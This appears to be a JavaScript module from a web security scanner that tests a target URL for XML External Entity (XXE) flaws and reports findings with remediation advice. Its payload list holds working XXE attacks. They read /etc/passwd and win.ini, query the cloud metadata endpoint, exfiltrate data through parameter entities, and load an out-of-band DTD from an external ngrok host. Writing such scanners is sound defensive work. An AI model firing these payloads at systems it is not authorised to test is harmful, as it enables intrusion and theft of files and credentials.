const XXE_PAYLOADS = [
  {
    name: 'Basic XXE - /etc/passwd',
    severity: 'critical',
    payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>',
    indicator: 'root:',
  },
  {
    name: 'Basic XXE - win.ini',
    severity: 'critical',
    payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root><name>&xxe;</name></root>',
    indicator: '[fonts]',
  },
  {
    name: 'Blind XXE Out-of-Band',
    severity: 'critical',
    payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://[3a25ec73.ngrok.io]/xxe.dtd"> %xxe;]><root><name>test</name></root>',
    indicator: 'xxe',
  },
  {
    name: 'XXE - SSRF via file',
    severity: 'high',
    payload: '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><name>&xxe;</name></root>',
    indicator: 'ami-id',
  },
  {
    name: 'XXE - PHP wrapper',
    severity: 'high',
    payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root><name>&xxe;</name></root>',
    indicator: 'cm9vd',
  },
  {
    name: 'XXE - Parameter Entity',
    severity: 'high',
    payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM \'http://localhost/?f=%file;\'>">%eval;]><root><name>&exfil;</name></root>',
    indicator: 'root',
  },
  {
    name: 'XXE - XInclude',
    severity: 'high',
    payload: '<root xmlns:xi="http://www.w3.org/2001/XInclude"><name><xi:include href="file:///etc/passwd" parse="text"/></name></root>',
    indicator: 'root:',
  },
];

const XXE_PARAMS = ['xml', 'data', 'input', 'body', 'payload', 'content', 'document'];

const XXE_HEADERS = {
  'Content-Type': 'application/xml',
  'Accept': 'application/xml, text/xml, */*',
};

async function scanXXE(targetUrl, httpClient) {
  const vulnerabilities = [];
  const baseUrl = targetUrl.replace(/\/$/, '');

  const postResults = await Promise.allSettled(XXE_PAYLOADS.map(test =>
    httpClient.post(baseUrl, test.payload, {
      timeout: 10000,
      headers: { ...XXE_HEADERS, 'User-Agent': process.env.USER_AGENT || 'WebSecurityScanner/1.0' },
      validateStatus: s => s < 500,
    }).then(response => {
      const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data || '');
      if (body.includes(test.indicator)) {
        return { test, body, contentType: response.headers['content-type'] || 'Unknown' };
      }
      return null;
    })
  ));

  for (const result of postResults) {
    if (result.status === 'fulfilled' && result.value) {
      const { test, body, contentType } = result.value;
      vulnerabilities.push({
        type: 'xxe',
        severity: test.severity,
        title: `XML External Entity (XXE) - ${test.name}`,
        description: `XXE injection detected using ${test.name}. The server processed an external entity and returned the content.`,
        endpoint: baseUrl,
        parameter: 'POST Body (XML)',
        payload: test.payload.substring(0, 100) + '...',
        evidence: `Test: ${test.name}\nContent-Type: application/xml\nResponse Content-Type: ${contentType}\nIndicator found: "${test.indicator}"\nResponse snippet: ${body.substring(0, 300)}`,
        remediation: 'Disable XML external entity processing. Use less complex data formats like JSON. Configure XML parsers to disable DOCTYPE declarations.',
        owasp_category: 'A05:2021 – Security Misconfiguration',
        cve_id: 'CWE-611',
      });
    }
  }

  // GET-based XXE tests (parallel per param)
  for (const param of XXE_PARAMS) {
    const getResults = await Promise.allSettled(XXE_PAYLOADS.slice(0, 2).map(test => {
      const testUrl = `${baseUrl}?${param}=${encodeURIComponent(test.payload)}`;
      return httpClient.get(testUrl, {
        timeout: 10000,
        headers: { 'User-Agent': process.env.USER_AGENT || 'WebSecurityScanner/1.0' },
        validateStatus: s => s < 500,
      }).then(response => {
        const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data || '');
        if (body.includes(test.indicator)) {
          return { param, test };
        }
        return null;
      });
    }));

    for (const result of getResults) {
      if (result.status === 'fulfilled' && result.value) {
        const { param, test } = result.value;
        vulnerabilities.push({
          type: 'xxe',
          severity: test.severity,
          title: `XML External Entity (XXE) via GET - ${test.name}`,
          description: `XXE injection via GET parameter "${param}". Server processed external entity from query string.`,
          endpoint: baseUrl,
          parameter: param,
          payload: `${param}=${encodeURIComponent(test.payload.substring(0, 50))}...`,
          evidence: `Test: ${test.name}\nParameter: ${param}\nIndicator found: "${test.indicator}"`,
          remediation: 'Disable XML external entity processing. Validate and sanitize all input.',
          owasp_category: 'A05:2021 – Security Misconfiguration',
          cve_id: 'CWE-611',
        });
        break;
      }
    }
  }

  return vulnerabilities;
}

module.exports = { scanXXE, XXE_PAYLOADS };